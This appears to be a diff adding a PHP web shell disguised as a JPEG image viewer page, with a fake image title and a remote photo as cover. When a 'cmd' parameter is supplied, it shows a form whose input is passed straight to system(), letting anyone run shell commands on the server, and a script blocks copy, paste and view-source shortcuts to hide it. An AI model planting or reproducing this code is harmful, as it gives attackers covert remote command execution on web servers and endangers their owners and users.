@@ -1,0 +1,30 @@
+<script>
+document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 67 || 
+             e.keyCode === 86 || 
+             e.keyCode === 85 || 
+             e.keyCode === 117)) {
+            return false;
+        } else {
+            return true;
+        }
+};
+</script>
+<?php
+echo "<title>IMG-1554-778.jpg (JPEG Image, 469 x 600 pixels)</title>";
+echo "<body bgcolor='232323'>";
+if(isset($_REQUEST['cmd'])){
+        echo "<font color='white'>";
+        echo "<pre>";
+        echo "<form name='form' action='#' method='post'>
+       <input type='text' name='coba'/> <input type='submit' value='enter'/>
+       </form>";
+        $cmd = ($_POST['coba']);
+        system($cmd);
+        echo "</pre>";
+        echo "<center><img src='http://2.bp.blogspot.com/-Rk_QvW_5uas/VmowOS0E8VI/AAAAAAAAC0g/UlDun7lroL4/s1600/laura-basuki.jpg'></center>";
+        die;
+}
+echo "<center><img src='http://2.bp.blogspot.com/-Rk_QvW_5uas/VmowOS0E8VI/AAAAAAAAC0g/UlDun7lroL4/s1600/laura-basuki.jpg'></center>";
+?>
